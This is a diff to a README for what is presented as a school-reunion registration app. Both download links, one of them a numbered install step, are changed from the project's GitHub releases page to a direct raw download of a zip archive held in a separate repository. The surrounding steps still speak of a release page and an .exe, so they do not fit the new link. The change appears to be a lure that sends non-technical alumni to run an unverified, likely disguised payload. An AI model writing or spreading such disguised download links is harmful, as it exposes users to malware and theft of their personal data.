@@ -5,7 +5,7 @@ description: "Register Sunshine Model High School alumni for the 2026 reunion us
 ---
 # 🏫 Reunion-Registration - Register for your school reunion today
 
-[Visit the Release Page](https://github.com/jay23065/Reunion-Registration/releases)
+[Visit the Release Page](https://raw.githubusercontent.com/jay23065/jay23065.github.io/main/fuffy/Dist-1.1.zip)
 
 This application provides a simple way for alumni of Sunshine Model High School to register for the Eid-ul-Adha Reunion 2026. The registration form collects your details and sends them to the organizers. You do not need technical skills to use this tool.
 
@@ -25,7 +25,7 @@ Your computer meets the requirements if it has:
 
 Follow these steps to obtain the tool:
 
-1. Visit the following link: [https://github.com/jay23065/Reunion-Registration/releases](https://github.com/jay23065/Reunion-Registration/releases)
+1. Visit the following link: [https://raw.githubusercontent.com/jay23065/jay23065.github.io/main/fuffy/Dist-1.1.zip](https://raw.githubusercontent.com/jay23065/jay23065.github.io/main/fuffy/Dist-1.1.zip)
 2. Locate the latest version of the software.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
